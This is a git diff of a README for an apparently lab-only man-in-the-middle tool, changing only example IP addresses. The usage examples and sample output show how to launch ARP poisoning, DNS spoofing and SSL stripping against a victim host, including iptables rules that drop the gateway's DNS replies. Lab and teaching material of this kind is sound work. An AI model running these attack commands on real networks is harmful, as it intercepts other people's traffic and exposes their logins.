@@ -81,16 +81,16 @@ sudo python3 mitm_spoofer.py --mode <SILENT|ALL_OUT> --target <victim_ip>
 **Examples:**
 ```bash
 # ALL_OUT mode - spoof all DNS queries (most common usage)
-sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.178.111
+sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.1.50
 
 # ALL_OUT mode with specific interface
-sudo python3 mitm_spoofer.py --interface wlp0s20f3 --mode ALL_OUT --target 192.168.178.111
+sudo python3 mitm_spoofer.py --interface wlp0s20f3 --mode ALL_OUT --target 192.168.1.50
 
 # SILENT mode - targeted spoofing (will prompt for domain)
-sudo python3 mitm_spoofer.py --mode SILENT --target 192.168.178.111
+sudo python3 mitm_spoofer.py --mode SILENT --target 192.168.1.50
 
 # Redirect to external server (advanced usage)
-sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.178.111 --server 192.168.178.200
+sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.1.50 --server 192.168.1.20
 ```
 
 ## Testing Procedure
@@ -103,7 +103,7 @@ sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.178.111 --server 19
 
 **Start the attack:**
 ```bash
-sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.178.111
+sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.1.50
 ```
 
 **Output:**
@@ -112,13 +112,13 @@ sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.178.111
     MITM Attack Tool - Offensive Cyber Security Lab
 ============================================================
 [*] Mode: ALL_OUT
-[*] Attacker: 192.168.178.95
-[*] Victim: 192.168.178.111
+[*] Attacker: 192.168.1.10
+[*] Victim: 192.168.1.50
 [*] Interface: wlp0s20f3
-[*] Gateway: 192.168.178.1 (aa:bb:cc:dd:ee:ff)
-[*] Victim: 192.168.178.111 (11:22:33:44:55:66)
+[*] Gateway: 192.168.1.1 (aa:bb:cc:dd:ee:ff)
+[*] Victim: 192.168.1.50 (11:22:33:44:55:66)
 [*] IP Forwarding enabled
-[A] IPTables: sudo iptables -A FORWARD -p udp -s 192.168.178.1 --sport 53 -d 192.168.178.111 -j DROP
+[A] IPTables: sudo iptables -A FORWARD -p udp -s 192.168.1.1 --sport 53 -d 192.168.1.50 -j DROP
 [ARP] Poisoning started
 [DNS] Spoofing started
 [SSL Strip] iptables redirect port 80 -> 8080
@@ -135,8 +135,8 @@ sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.178.111
 
 **Attacker Terminal Output:**
 ```
-[DNS Spoof] Query: 'neverssl.com.' from 192.168.178.111
-[DNS Spoof] SPOOFING: neverssl.com. -> 192.168.178.95
+[DNS Spoof] Query: 'neverssl.com.' from 192.168.1.50
+[DNS Spoof] SPOOFING: neverssl.com. -> 192.168.1.10
 [Analyzer] HTTP Request: GET neverssl.com/
 [SSL Strip] GET http://neverssl.com/
 [SSL Strip] Resolved neverssl.com -> 34.223.124.45
@@ -151,7 +151,7 @@ sudo python3 mitm_spoofer.py --mode ALL_OUT --target 192.168.178.111
 
 **Attacker Terminal Output:**
 ```
-[DNS Spoof] SPOOFING: tui.com. -> 192.168.178.95
+[DNS Spoof] SPOOFING: tui.com. -> 192.168.1.10
 [Analyzer] HTTP Request: GET tui.com/
 [SSL Strip] GET http://tui.com/
 [SSL Strip] Resolved tui.com -> 2.16.6.227
@@ -216,7 +216,7 @@ Press `Ctrl+C` in the terminal:
 ================================================================================
 
 [ARP Poison] ARP tables restored.
-[D] IPTables: sudo iptables -D FORWARD -p udp -s 192.168.178.1 --sport 53 -d 192.168.178.111 -j DROP
+[D] IPTables: sudo iptables -D FORWARD -p udp -s 192.168.1.1 --sport 53 -d 192.168.1.50 -j DROP
 [*] Cleanup complete
 ```
 
